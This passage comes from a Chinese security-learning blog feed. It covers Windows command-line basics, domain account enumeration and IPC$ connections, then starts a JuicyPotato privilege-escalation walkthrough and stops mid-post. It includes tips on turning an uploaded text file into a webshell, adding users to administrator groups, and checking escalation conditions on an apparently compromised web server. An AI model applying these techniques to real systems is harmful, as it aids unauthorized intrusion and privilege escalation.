   16:41              0 1.py</span><br><span class="line">-a----       2020&#x2F;10&#x2F;25     10:52         704029 WinHex.exe</span><br><span class="line">-a----        2020&#x2F;11&#x2F;3      0:09            740 XnView.lnk</span><br><span class="line">-a----       2020&#x2F;11&#x2F;16      8:28         179855 大三学习.zip</span><br><span class="line">-a----       2020&#x2F;11&#x2F;12     10:58           1262 天猫双11.lnk</span><br><span class="line">-a----        2020&#x2F;11&#x2F;7     19:21            607 有道云笔记.lnk</span><br></pre></td></tr></table></figure><h2 id="复制与合并文件"><a href="#复制与合并文件" class="headerlink" title="复制与合并文件"></a>复制与合并文件</h2><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">copy 源文件 目的文件或者是目的目录</span><br></pre></td></tr></table></figure><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">PS C:\Users\12521\Desktop&gt; copy 1.py 2.py</span><br></pre></td></tr></table></figure><p>复制1.py到2.py。</p><p>合并多个文件</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">copy 1.txt+2.txt+3.txt 123.txt</span><br></pre></td></tr></table></figure><h2 id="重命名文件"><a href="#重命名文件" class="headerlink" title="重命名文件"></a>重命名文件</h2><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">rename 源文件名 新文件名</span><br></pre></td></tr></table></figure><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">ren 源文件名 新文件名</span><br></pre></td></tr></table></figure><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">PS C:\Users\12521\Desktop&gt; ren 1.py steady.py</span><br></pre></td></tr></table></figure><p>这个命令还是不交重要的，再一次渗透过程中，上传一个txt文件配合命令执行，使用该命令将shell文件转化成php或者asp，直接连接目标马。</p><h2 id="输入输出重定向和管道"><a href="#输入输出重定向和管道" class="headerlink" title="输入输出重定向和管道"></a>输入输出重定向和管道</h2><h3 id="输出重定向"><a href="#输出重定向" class="headerlink" title="输出重定向"></a>输出重定向</h3><p>将命令输入输入到文件</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">PS C:\Users\12521\Desktop&gt; dir &gt; 1.txt</span><br></pre></td></tr></table></figure><h3 id="管道"><a href="#管道" class="headerlink" title="管道"></a>管道</h3><h2 id="显示文本内容"><a href="#显示文本内容" class="headerlink" title="显示文本内容"></a>显示文本内容</h2><p>显示文本内容，类似于linux下的cat</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">PS C:\Users\12521\Desktop&gt; type 2.py</span><br><span class="line">happy</span><br></pre></td></tr></table></figure><h2 id="将内容写入到指定文件中"><a href="#将内容写入到指定文件中" class="headerlink" title="将内容写入到指定文件中"></a>将内容写入到指定文件中</h2><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">PS C:\Users\12521\Desktop&gt; echo &quot;good happy&quot; &gt; 2.txt</span><br><span class="line">PS C:\Users\12521\Desktop&gt; type 2.txt</span><br><span class="line">good happy</span><br></pre></td></tr></table></figure><h2 id="搜索指定文本内容"><a href="#搜索指定文本内容" class="headerlink" title="搜索指定文本内容"></a>搜索指定文本内容</h2><p>在一个文件或多个文件中搜索指定的文本字符串。当搜索指定的文件后，find 将显示出包含指定字符串的所有行。</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br></pre></td><td class="code"><pre><span class="line">find &quot;文本内容&quot; 文件名</span><br><span class="line">C:\Users\12521\Desktop&gt;find &#x2F;?</span><br><span class="line">在文件中搜索字符串。</span><br><span class="line"></span><br><span class="line">FIND [&#x2F;V] [&#x2F;C] [&#x2F;N] [&#x2F;I] [&#x2F;OFF[LINE]] &quot;string&quot; [[drive:][path]filename[ ...]]</span><br><span class="line"></span><br><span class="line">  &#x2F;V         显示所有未包含指定字符串的行。</span><br><span class="line">  &#x2F;C         仅显示包含字符串的行数。</span><br><span class="line">  &#x2F;N         显示行号。</span><br><span class="line">  &#x2F;I         搜索字符串时忽略大小写。</span><br><span class="line">  &#x2F;OFF[LINE] 不要跳过具有脱机属性集的文件。</span><br><span class="line">  &quot;string&quot; 指定要搜索的文本字符串。</span><br><span class="line">  [drive:][path]filename</span><br><span class="line">             指定要搜索的文件。</span><br><span class="line"></span><br><span class="line">如果没有指定路径，FIND 将搜索在提示符处键入</span><br><span class="line">的文本或者由另一命令产生的文本。</span><br></pre></td></tr></table></figure><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">C:\Users\12521\Desktop&gt;find &quot;steady&quot; 2.py</span><br><span class="line"></span><br><span class="line">---------- 2.PY</span><br><span class="line">d-----       2020&#x2F;11&#x2F;12     17:04                steady-learn</span><br><span class="line">-a----       2020&#x2F;11&#x2F;16     16:41              0 steady.py</span><br></pre></td></tr></table></figure><h2 id="findstr命令"><a href="#findstr命令" class="headerlink" title="findstr命令"></a>findstr命令</h2><p>使用常规表达式搜索文件中的文本模式。</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br></pre></td><td class="code"><pre><span class="line">C:\Users\12521\Desktop&gt;findstr &#x2F;?</span><br><span class="line">在文件中寻找字符串。</span><br><span class="line"></span><br><span class="line">FINDSTR [&#x2F;B] [&#x2F;E] [&#x2F;L] [&#x2F;R] [&#x2F;S] [&#x2F;I] [&#x2F;X] [&#x2F;V] [&#x2F;N] [&#x2F;M] [&#x2F;O] [&#x2F;P] [&#x2F;F:file]</span><br><span class="line">        [&#x2F;C:string] [&#x2F;G:file] [&#x2F;D:dir list] [&#x2F;A:color attributes] [&#x2F;OFF[LINE]]</span><br><span class="line">        strings [[drive:][path]filename[ ...]]</span><br><span class="line"></span><br><span class="line">  &#x2F;B         在一行的开始配对模式。</span><br><span class="line">  &#x2F;E         在一行的结尾配对模式。</span><br><span class="line">  &#x2F;L         按字使用搜索字符串。</span><br><span class="line">  &#x2F;R         将搜索字符串作为一般表达式使用。</span><br><span class="line">  &#x2F;S         在当前目录和所有子目录中搜索匹配文件。</span><br><span class="line">  &#x2F;I         指定搜索不分大小写。</span><br><span class="line">  &#x2F;X         打印完全匹配的行。</span><br><span class="line">  &#x2F;V         只打印不包含匹配的行。</span><br><span class="line">  &#x2F;N         在匹配的每行前打印行数。</span><br><span class="line">  &#x2F;M         如果文件含有匹配项，只打印其文件名。</span><br><span class="line">  &#x2F;O         在每个匹配行前打印字符偏移量。</span><br><span class="line">  &#x2F;P         忽略有不可打印字符的文件。</span><br><span class="line">  &#x2F;OFF[LINE] 不跳过带有脱机属性集的文件。</span><br><span class="line">  &#x2F;A:attr    指定有十六进位数字的颜色属性。请见 &quot;color &#x2F;?&quot;</span><br><span class="line">  &#x2F;F:file    从指定文件读文件列表 (&#x2F; 代表控制台)。</span><br><span class="line">  &#x2F;C:string  使用指定字符串作为文字搜索字符串。</span><br><span class="line">  &#x2F;G:file    从指定的文件获得搜索字符串。 (&#x2F; 代表控制台)。</span><br><span class="line">  &#x2F;D:dir     查找以分号为分隔符的目录列表</span><br><span class="line">  strings    要查找的文字。</span><br><span class="line">  [drive:][path]filename</span><br><span class="line">             指定要查找的文件。</span><br><span class="line"></span><br><span class="line">除非参数有 &#x2F;C 前缀，请使用空格隔开搜索字符串。</span><br><span class="line">例如: &#39;FINDSTR &quot;hello there&quot; x.y&#39; 在文件 x.y 中寻找 &quot;hello&quot; 或</span><br><span class="line">&quot;there&quot;。&#39;FINDSTR &#x2F;C:&quot;hello there&quot; x.y&#39; 文件 x.y  寻找</span><br><span class="line">&quot;hello there&quot;。</span><br><span class="line"></span><br><span class="line">一般表达式的快速参考:</span><br><span class="line">  .        通配符: 任何字符</span><br><span class="line">  *        重复: 以前字符或类出现零或零以上次数</span><br><span class="line">  ^        行位置: 行的开始</span><br><span class="line">  $        行位置: 行的终点</span><br><span class="line">  [class]  字符类: 任何在字符集中的字符</span><br><span class="line">  [^class] 补字符类: 任何不在字符集中的字符</span><br><span class="line">  [x-y]    范围: 在指定范围内的任何字符</span><br><span class="line">  \x       Escape: 元字符 x 的文字用法</span><br><span class="line">  \&lt;xyz    字位置: 字的开始</span><br><span class="line">  xyz\&gt;    字位置: 字的结束</span><br><span class="line"></span><br></pre></td></tr></table></figure><p> findstr 接受的元字符。</p><table><thead><tr><th>字符</th><th>值</th></tr></thead><tbody><tr><td>.</td><td>通配符：任何字符</td></tr><tr><td>*</td><td>重复：以前字符或类的零次或多次出现</td></tr><tr><td>^</td><td>行位置：行的开始</td></tr><tr><td>$</td><td>行位置：行的结尾</td></tr><tr><td>[class]</td><td>字符类：集合中任何一个字符</td></tr><tr><td>[^class]</td><td>反类：不在集合中的任何一个字符</td></tr><tr><td>[x-y</td><td>范围：范围：指定范围内的任何字符</td></tr><tr><td>\x</td><td>取消：元字符 x 的文字用途</td></tr><tr><td>&lt;xyz</td><td>字位置：字首</td></tr><tr><td>xyz&gt;</td><td>字位置：字尾</td></tr></tbody></table><h2 id="递归查找文件"><a href="#递归查找文件" class="headerlink" title="递归查找文件"></a>递归查找文件</h2><p>递归查找当前目录以及子目录中的后缀为md的文件</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br></pre></td><td class="code"><pre><span class="line">C:\Users\12521\Desktop&gt;for &#x2F;r steady-learn %i in (*.md) do @echo %i</span><br><span class="line">C:\Users\12521\Desktop\steady-learn\Buuctf.md</span><br><span class="line">C:\Users\12521\Desktop\steady-learn\CTF--python库zipfile的使用.md</span><br><span class="line">C:\Users\12521\Desktop\steady-learn\CTF-python库的使用.md</span><br><span class="line">C:\Users\12521\Desktop\steady-learn\CTF-密码刷题.md</span><br><span class="line">C:\Users\12521\Desktop\steady-learn\CTF-杂项.md</span><br><span class="line">C:\Users\12521\Desktop\steady-learn\CTF-杂项刷题.md</span><br><span class="line">C:\Users\12521\Desktop\steady-learn\CTF-杂项刷题1.md</span><br><span class="line">C:\Users\12521\Desktop\steady-learn\CTF杂项手册.md</span><br><span class="line">C:\Users\12521\Desktop\steady-learn\Linux命令.md</span><br><span class="line">C:\Users\12521\Desktop\steady-learn\Python学习.md</span><br><span class="line">C:\Users\12521\Desktop\steady-learn\Wireshark.md</span><br><span class="line">C:\Users\12521\Desktop\steady-learn\内存取证.md</span><br><span class="line">C:\Users\12521\Desktop\steady-learn\进制介绍.md</span><br><span class="line">C:\Users\12521\Desktop\steady-learn\PHP开发学习\PHP开发环境安装.md</span><br></pre></td></tr></table></figure><h2 id="for循环"><a href="#for循环" class="headerlink" title="for循环"></a>for循环</h2><h3 id="命令解释"><a href="#命令解释" class="headerlink" title="命令解释"></a>命令解释</h3><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">for、in和do是for语句的关键字，它们三个缺一不可；</span><br><span class="line">%%I是for语句中对形式变量的引用，即使变量l在do后的语句中没有参与语句的执行，也是必须出现的；</span><br><span class="line">in之后，do之前的括号不能省略；</span><br><span class="line">command1表示字符串或变量，command2表示字符串、变量或命令语句；</span><br></pre></td></tr></table></figure><h3 id="命令例子"><a href="#命令例子" class="headerlink" title="命令例子"></a>命令例子</h3><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">C:\Users\12521&gt;for  %I in (ABC) do echo %I</span><br><span class="line"></span><br><span class="line">C:\Users\12521&gt;echo ABC</span><br><span class="line">ABC</span><br></pre></td></tr></table></figure><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br></pre></td><td class="code"><pre><span class="line">C:\Users\12521\Desktop&gt;for %i in (*.*) do echo &quot;%i&quot;</span><br><span class="line"></span><br><span class="line">C:\Users\12521\Desktop&gt;echo &quot;010 Editor.lnk&quot;</span><br><span class="line">&quot;010 Editor.lnk&quot;</span><br><span class="line"></span><br><span class="line">C:\Users\12521\Desktop&gt;echo &quot;2.py&quot;</span><br><span class="line">&quot;2.py&quot;</span><br><span class="line"></span><br><span class="line">C:\Users\12521\Desktop&gt;echo &quot;for&quot;</span><br><span class="line">&quot;for&quot;</span><br><span class="line"></span><br><span class="line">C:\Users\12521\Desktop&gt;echo &quot;login2.aspx&quot;</span><br><span class="line">&quot;login2.aspx&quot;</span><br><span class="line"></span><br><span class="line">C:\Users\12521\Desktop&gt;echo &quot;steady.py&quot;</span><br><span class="line">&quot;steady.py&quot;</span><br></pre></td></tr></table></figure><h2 id="隐藏文件"><a href="#隐藏文件" class="headerlink" title="隐藏文件"></a>隐藏文件</h2><h3 id="attrib-命令"><a href="#attrib-命令" class="headerlink" title="attrib 命令"></a>attrib 命令</h3><p>用于修改文件夹及文件的属性。文件的属性主要有：存档、只读、隐藏和系统。</p><p>隐藏文件</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">attrib +H 文件名</span><br></pre></td></tr></table></figure><p>使用<code>dir</code>命令看不见隐藏的文件，但是使用<code>attrib</code>命令依旧可以看见隐藏的文件。</p><p>取消隐藏文件</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">attrib -H 文件名</span><br></pre></td></tr></table></figure><p>隐藏文件夹，需要加<code>/S /D</code></p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">attrib +H 文件夹名称 &#x2F;S &#x2F;D</span><br></pre></td></tr></table></figure><h2 id="进程管理命令"><a href="#进程管理命令" class="headerlink" title="进程管理命令"></a>进程管理命令</h2><h3 id="tasklist-命令"><a href="#tasklist-命令" class="headerlink" title="tasklist 命令"></a>tasklist 命令</h3><p>tasllist 命令用于查询进程列表，该命令即可用于本机也可用于远程计算机。</p><p>默认显示的结果包括：映像名称、PID、会话名称、会话、内存使用。</p><p>查看远程计算机的进程：</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">tasklist &#x2F;S 127.0.0.1 &#x2F;U good &#x2F;P good</span><br></pre></td></tr></table></figure><h3 id="taskkill-命令"><a href="#taskkill-命令" class="headerlink" title="taskkill 命令"></a>taskkill 命令</h3><p>tasklill 命令的作用是终止正在运行的进程。</p><h2 id="用户以及用户组的命令"><a href="#用户以及用户组的命令" class="headerlink" title="用户以及用户组的命令"></a>用户以及用户组的命令</h2><h3 id="net-user-命令"><a href="#net-user-命令" class="headerlink" title="net user 命令"></a>net user 命令</h3><p>显示用户信息</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">net user 用户名</span><br></pre></td></tr></table></figure><p>添加用户并赋予密码</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">net user 用户名 密码 &#x2F;add</span><br></pre></td></tr></table></figure><p>删除用户</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">net 用户名  &#x2F;del</span><br></pre></td></tr></table></figure><p>更改用户的密码</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">net user 用户名 密码</span><br></pre></td></tr></table></figure><p>禁用某用户</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">net user 用户名 &#x2F;active:no</span><br></pre></td></tr></table></figure><p>查看计算机上的用户列表</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">net user</span><br></pre></td></tr></table></figure><h3 id="net-localgroup-命令"><a href="#net-localgroup-命令" class="headerlink" title="net localgroup 命令"></a>net localgroup 命令</h3><p>查看所有用户分组</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">net localgroup</span><br></pre></td></tr></table></figure><p>查看某个用户组的情况</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">net localgroup 用户组名</span><br></pre></td></tr></table></figure><p>将某个用户添加到某个组</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">net localgroup 用户组名 用户 &#x2F;add</span><br></pre></td></tr></table></figure><p>将某个用户移出某个组</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">net localgroup 用户组名 用户 &#x2F;del</span><br></pre></td></tr></table></figure><h2 id="域内常用命令"><a href="#域内常用命令" class="headerlink" title="域内常用命令"></a>域内常用命令</h2><p>域为：<code>good.com</code></p><p>使用域管理员的登录服务器:</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">C:\&gt;whoami</span><br><span class="line">good\administrator</span><br></pre></td></tr></table></figure><p>以本机管理员登录:</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">C:\&gt;whoami</span><br><span class="line">steady\administrator</span><br></pre></td></tr></table></figure><p>查看所在域的用户列表:</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">C:\&gt; net user &#x2F;domain</span><br><span class="line">这项请求将在域 good.com 的域控制器处理。</span><br></pre></td></tr></table></figure><p>获取域用户的详细信息：</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">C:\&gt; net user 域内用户名 &#x2F;domain</span><br><span class="line">这项请求将在域 good.com 的域控制器处理。</span><br></pre></td></tr></table></figure><p>在域中添加用户：</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">C:\&gt; net user 用户 用户名 &#x2F;add &#x2F;domain</span><br><span class="line">这项请求将在域 good.com 的域控制器处理。</span><br></pre></td></tr></table></figure><p>将域用户添加到域管理员组:</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">C:\ &gt;net localgroup administrators 用户名 &#x2F;add &#x2F;domain</span><br><span class="line">这项请求将在域 good.com 的域控制器处理。</span><br></pre></td></tr></table></figure><p>查看所在域的用户组：</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">C:\&gt; net group &#x2F;domain</span><br><span class="line">这项请求将在域 good.com 的域控制器处理。</span><br></pre></td></tr></table></figure><p>查看域管理员组的情况：</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">C:\&gt; net group &quot;domain admins&quot; &#x2F;domain</span><br><span class="line">这项请求将在域 good.com 的域控制器处理。</span><br></pre></td></tr></table></figure><p>获取域内置administrators组：</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">C:\&gt; net localgroup administrators &#x2F;domain</span><br><span class="line">这项请求将在域 good.com 的域控制器处理。</span><br></pre></td></tr></table></figure><p>获取域控列表：</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">C:\&gt; net group &quot;domain controllers&quot; &#x2F;domain</span><br><span class="line">这项请求将在域 good.com 的域控制器处理。</span><br></pre></td></tr></table></figure><p>获得所有域成员计算机列表：</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">C:\&gt; net group &quot;domain computers&quot; &#x2F;domain</span><br><span class="line">这项请求将在域 good.com 的域控制器处理。</span><br></pre></td></tr></table></figure><p>查询机器属于哪个域：</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">C:\&gt; net config Workstation</span><br></pre></td></tr></table></figure><h2 id="远程管理及文件传输"><a href="#远程管理及文件传输" class="headerlink" title="远程管理及文件传输"></a>远程管理及文件传输</h2><h3 id="Telnet-命令"><a href="#Telnet-命令" class="headerlink" title="Telnet 命令"></a>Telnet 命令</h3><h3 id="Ftp命令"><a href="#Ftp命令" class="headerlink" title="Ftp命令"></a>Ftp命令</h3><h3 id="IPC-远程连接"><a href="#IPC-远程连接" class="headerlink" title="IPC$ 远程连接"></a>IPC$ 远程连接</h3><p>IPC 是 Intelnet Process Connection 的缩写，它是 Windows 主机之间相互通信的管道。默认状态下，该管道使用 139、445端口侦听其他电脑发出的连接请求。利用 IPC$，系统管理员可以方便地管理没有开启任何共享文档的远程主机。</p><p>IPC$ 可以分为 IPC$ 空连接和 IPC$ 特定权限连接两种：</p><ul><li>建立 IPC$ 空连接的条件相对较宽，只需目标主机没有取消默认的 IPC$ 管道，并且 Server 服务处于运行状态即可。</li><li>IPC$ 特定权限连接是在 IPC$ 空连接的基础上附加可用的账户和密码。换而言之，只有事先获得目标主机的账户与密码，才能建立 IPC$ 特定权限连接</li></ul><p>建立 IPC$ 空连接</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">net user \\目标IP地址\ipc$ &quot;&quot; &#x2F;user:&quot;&quot;</span><br></pre></td></tr></table></figure><p>建立 IPC$ 特定权限连接</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">net user \\目标IP地址\ipc$ &quot;密码&quot; &#x2F;user:&quot;用户名&quot;</span><br></pre></td></tr></table></figure><h1 id="windows权限基础"><a href="#windows权限基础" class="headerlink" title="windows权限基础"></a>windows权限基础</h1><ul><li>Users：普通用户权限，是系统中最安全的权限(因为分配给该组的默认权限不允许成员修改操作系统的设置或用户资料)。</li><li>Administrator：管理员权限，可以利用Windows的机制将自己提升为System权限，以便操作SAM文件等。</li><li>System：系统权限，可以对SAM等敏感文件进行读取，往往需要将Administrator权限提升到System权限才可以对散列值进行Dump操作。</li><li>TrustedInstaller：Windows中的最高权限，对系统文件，即使拥有System权限也无法修改，只有拥有TrustedInstaller权限才可以修改系统文件。</li></ul>]]></content>
      
      
      <categories>
          
          <category> 渗透测试 </category>
          
      </categories>
      
      
        <tags>
            
            <tag> 渗透测试 </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>渗透测试--windows系统信息收集与提权-(3)</title>
      <link href="2020/11/17/%E6%B8%97%E9%80%8F%E6%B5%8B%E8%AF%95--windows%E7%B3%BB%E7%BB%9F%E4%BF%A1%E6%81%AF%E6%94%B6%E9%9B%86%E4%B8%8E%E6%8F%90%E6%9D%83-(3)/"/>
      <url>2020/11/17/%E6%B8%97%E9%80%8F%E6%B5%8B%E8%AF%95--windows%E7%B3%BB%E7%BB%9F%E4%BF%A1%E6%81%AF%E6%94%B6%E9%9B%86%E4%B8%8E%E6%8F%90%E6%9D%83-(3)/</url>
      
        <content type="html"><![CDATA[<h2 id="Windows系统提权"><a href="#Windows系统提权" class="headerlink" title="Windows系统提权"></a>Windows系统提权</h2><h3 id="脏土豆提权"><a href="#脏土豆提权" class="headerlink" title="脏土豆提权"></a>脏土豆提权</h3><h4 id="简介"><a href="#简介" class="headerlink" title="简介"></a>简介</h4><p>烂土豆提权就是俗称的MS16-075。</p><p>可以将Windows工作站上的特权从最低级别提升到”NT AUTHORITY \ SYSTEM” – Windows计算机上可用的最高特权级别。</p><h4 id="利用条件"><a href="#利用条件" class="headerlink" title="利用条件"></a>利用条件</h4><h5 id="权限是否开启"><a href="#权限是否开启" class="headerlink" title="权限是否开启"></a>权限是否开启</h5><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line">D:\S_JCIN\WebSite\OutWeb\L_CT\News&gt; whoami /priv</span><br><span class="line">PRIVILEGES INFORMATION</span><br><span class="line">----------------------</span><br><span class="line">特殊权限名称                  描述                   状况  </span><br><span class="line">============================= ====================== ======</span><br><span class="line">SeAuditPrivilege              产生安全稽核           已停用</span><br><span class="line">SeIncreaseQuotaPrivilege      调整处理程序记忆体配额 已停用</span><br><span class="line">SeAssignPrimaryTokenPrivilege 更换处理层权杖         已停用</span><br><span class="line">SeChangeNotifyPrivilege       略过周游检查           已启用</span><br><span class="line">SeImpersonatePrivilege        验证后模拟用户端       已启用</span><br><span class="line">SeCreateGlobalPrivilege       建立全域物件           已启用</span><br></pre></td></tr></table></figure><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">如果开启SeImpersonate权限，juicypotato的参数可以使用-t t</span><br><span class="line">如果开启SeAssignPrimaryToken权限，juicypotato的参数可以使用-t u</span><br><span class="line">如果均开启，可以选择-t *</span><br><span class="line">如果均未开启，那么无法提权</span><br></pre></td></tr></table></figure><h5 id="RPC默认端口"><a href="#RPC默认端口" class="headerlink" title="RPC默认端口"></a>RPC默认端口</h5><h6 id="查看端口是否开启"><a href="#查看端口是否开启" class="headerlink" title="查看端口是否开启"></a>查看端口是否开启</h6><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">D:\S_JCIN\WebSite\OutWeb\L_CT\News&gt; netstat -ano | findstr &quot;135&quot;</span><br><span class="line">  TCP    0.0.0.0:135            0.0.0.0:0              LISTENING       760</span><br><span class="line">  TCP    127.0.0.1:3148         127.0.0.1:135          TIME_WAIT       0</span><br><span class="line">  TCP    127.0.0.1:3151         127.0.0.1:135          TIME_WAIT       0</span><br><span class="line">  TCP    127.0.0.1:3154         127.0.0.1:135          TIME_WAIT       0</span><br><span class="line">  TCP    127.0.0.1:3157         127.0.0.1:135          TIME_WAIT       0</span><br></pre></td></tr></table></figure><h6 id="查看端口对应的服务"><a href="#查看端口对应的服务" class="headerlink" title="查看端口对应的服务"></a>查看端口对应的服务</h6><p>如果被修改(例如为1234)，juicypotato的参数可以使用<code>-n 1234</code></p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">D:\S_JCIN\WebSite\OutWeb\L_CT\News&gt; tasklist | findstr 760</span><br><span class="line">svchost.exe                    760 Console                    0      4,360 K</span><br></pre></td></tr></table></figure><p>svchost.exe是一个RPC服务。</p><h5 id="选择可用的CLSID"><a href="#选择可用的CLSID" 